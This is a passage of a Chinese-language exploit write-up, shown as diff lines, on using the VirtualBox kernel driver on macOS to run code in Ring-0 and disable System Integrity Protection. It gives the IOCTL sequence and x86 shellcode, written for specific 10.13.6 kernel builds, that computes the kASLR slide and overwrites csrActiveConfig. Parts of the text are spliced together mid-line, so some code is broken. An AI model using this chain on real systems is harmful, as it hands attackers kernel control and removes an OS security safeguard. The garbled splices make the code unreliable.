@@ -1,0 +1,112 @@
+    ldropen.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
+    ldropen.u.In.cbImageWithTabs = 100;
+    ldropen.u.In.cbImageBits = 80;
+    strcpy(ldropen.u.In.szFilename, "/tmp/notsupported");
+    strcpy(ldropen.u.In.szName, "XPN", 3);
+    ioctl(fd, SUP_IOCTL_LDR_OPEN, &ldropen);
+响应中提供了一个指向`u.Out.pvImageBase`分配的内存区域指针。下次调用中需要用到。
+**SUP_IOCTL_LDR_LOAD**
+我们需要在Ring-0中执行IOCTL代码的最后一个`SUP_IOCTL_LDR_LOAD`，它接收我们之前分配的可执行内存的参数并加载的任意数据。
+回顾IOCTL的处理过程，在对我们提供的图像数据进行了一些处理步骤之后，我们得到了u.In.pfnModuleInit的值。令人惊讶的是，这个值后来被用于Ring-0中的执行传递给用户提供的地址:
+    pImage->pfnModuleInit = pReq->u.In.pfnModuleInit;
+    ...
+    rc = pImage->pfnModuleInit(pImage);
+在准备好所有组件之后，我们可以完成以下步骤来执行Ring-0中的代码:
+  1. 连接到`org_virtualbox_SupDrv`的`IOService`会话，传递`SUP_DARWIN_IOSERVICE_COOKIE`
+  2. 打开`/dev/vboxdrv`
+  3. 发送`SUP_IOCTL_COOKIE`的`IOCTL`请求
+  4. 使用之前返回的`cookie`发送`SUP_IOCTL_LDR_OPEN`的`IOCTL`请求
+  5. 使用先前分配的内存、可执行代码和指向已分配内存的`pfnModuleInit`属性发送`SUP_IOCTL_LDR_LOAD`的`IOCTL`请求
+现在知道了如何获得任意的内核代码执行，这个漏洞可以用来创建一个rootkit，也可以用来破坏内核内存，但是在本文中，我想利用这个漏洞来禁用SIP。
+* * *
+### 0x02 禁用SIP
+为了更好的理解如何禁用SIP，首先需要了解它是如何工作的，以及它是如何由内核强制执行的。为此，我们将一起看一下XNU的代码。
+首先要关注的是syscall程序里的syscall_csr_check:
+    int
+    syscall_csr_check(struct csrctl_args *args)
+    {
+    csr_config_t mask = 0;
+    int error = 0;
+    if (args->useraddr == 0 || args->usersize != sizeof(mask))
+    return EINVAL;
+    error = copyin(args->useraddr, &mask, sizeof(mask));
+    if (error)
+    return error;
+    return csr_check(mask);
+    }
+如图所示，控制被传递给csr_check函数:
+    int
+    csr_check(csr_config_t mask)
+    {
+    boot_args *args = (boot_args *)PE_state.bootArgs;
+    if (mask & CSR_ALLOW_DEVICE_CONFIGURATION)
+    return (args->flags & kBootArgsFlagCSRConfigMode) ? 0 : EPERM;
+    csr_config_t config;
+    int ret = csr_get_active_config(&config);
+    if (ret) {
+    return ret;
+    }
+    …
+这里可以看到一个由内核公开的符号`PE_state`，对代码的进一步跟踪发现，`PE_state`允许我们通过以下方式访问CSR标志:
+    boot_args *args = (boot_args *)PE_state.bootArgs;
+    if (args->flags & kBootArgsFlagCSRActiveConfig) {
+    *config = args->csrActiveConfig & CSR_VALID_FLAGS;
+    ...
+`boot_args.csrActiveConfig`看起来是内核调试器转储的好地方:
+    (lldb) print ((boot_args *)PE_state.bootArgs)->csrActiveConfig
+    (uint32_t) $7 = 103
+我们可以在`bsd/sys/csr.h`看到一个应用的位掩码。实际上可以设置为一个标志，包括启用/禁用受限文件系统访问、调试、无符号kexts的选项:
+    /* Rootless configuration flags */
+    #define CSR_ALLOW_UNTRUSTED_KEXTS (1 u.In.abImage, shellcode, sizeof(shellcode));
+    ldr->Hdr.u32Cookie = cookie.u.Out.u32Cookie;
+    ldr->Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
+    ldr->Hdr.cbIn = SUP_IOCTL_LDR_LOAD_SIZE_IN(100);
+    ldr->Hdr.cbOut = 2080;
+    ldr->Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
+    ldr->u.In.cbImageWithTabs = 100;
+    ldr->u.In.cbImageBits = 80;
+    ldr->u.In.pvImageBase = ldropen.u.Out.pvImageBase;
+    ldr->u.In.pfnModuleInit = ldropen.u.Out.pvImageBase;
+    ioctl(fd, SUP_IOCTL_LDR_LOAD, ldr);
+    printf("[*] SIP Disabled!\n\n");
+在这里添加了一条调试语句，显示了我们的伪加载器将被添加到的内存位置。如果我们将所有这些连接在一起，并在正确的位置添加一个断点(我们分配的内核内存)，我们可以看到我们的内核调试器中的一个断点:
+现在剩下要做的就是编写代码，然后处理kASLR。
+### 0x04 kASLR处理
+到目前为止，我们还没有涉及到的领域之一是kASLR，它被用于macOS目前所有的版本，使开发人员的开发工作更加困难。在我们的例子中，kASLR并不构成太大的威胁，因为我们在内核空间中有完整的代码执行。这意味着我们可以简单地使用shellcode搜索内核地址，并利用它来计算kASLR幻灯片。
+让我们看看当我们到达断点时的回溯:
+可以看到堆栈上有一些内核指针，可以使用它来计算kASLR
+slide。由于kASLR被禁用，XNU内核被加载到一个固定地址`0xffffff8000200000`。我们就可以通过在没有kASLR的情况下加载时从堆栈的原始位置减去在堆栈上找到的指针来计算kASLR幻灯片。
+如果我们选择在`kernel.developmentspec_ioctl`内的`backtrace`中显示的第一个内核地址，我们可以编写shellcode遍历堆栈帧来计算kASLR
+slide，然后修改`csrActiveConfig`:
+    push rbx
+    mov rax, [rbp] ; First stack frame
+    mov rax, [rax] ; Second stack frame
+    mov rax, [rax] ; Third stack frame
+    mov rax, [rax + 8] ; Kernel address (0xffffff800062b101 in development kernel)
+    mov rbx, 0xffffff800062b101
+    sub qword rax, rbx ; Get slide
+    mov rbx, 0xffffff8000e838f8 + 0xA0
+    add qword rax, rbx ; PE Boot + bootArgs
+    mov rax, [rax]
+    mov byte [rax + 0x498], 0x67 ; csrActiveconfig
+    mov rax, 2
+    pop rbx
+    ret
+上述shellcode是针对内核10.13.6_17G65写的,针对其他版本不同的地方也就利用符号计算所需的地址出现在任何内核映像(见nm命令),或通过使用VMWare调试器引导到一个非开发性内核和简单地添加断点并查看回溯。
+例如，如果我们想要针对10.13.6写shellcode时，会得到以下代码:
+    push rbx
+    mov rax, [rbp] ; First stack frame
+    mov rax, [rax] ; Second stack frame
+    mov rax, [rax] ; Third stack frame
+    mov rax, [rax + 8] ; Kernel address
+    mov rbx, 0xFFFFFF80004D6EB1
+    sub qword rax, rbx ; Get slide
+    mov rbx, 0xFFFFFF8000C1D1A8 + 0xA0
+    add qword rax, rbx ; PE Boot + bootArgs
+    mov rax, [rax]
+    mov byte [rax + 0x498], 0x67 ; csrActiveconfig
+    mov rax, 2
+    pop rbx
+    ret
+现在有了利用漏洞所需的所有组件，绕过kASLR并修改SIP，让我们把所有步骤放在一起，看看这个在非开发内核上运行的演示:
+[https://www.youtube.com/embed/W05fVNabTBY?start=0&end=2797](https://www.youtube.com/embed/W05fVNabTBY?start=0&end=2797)
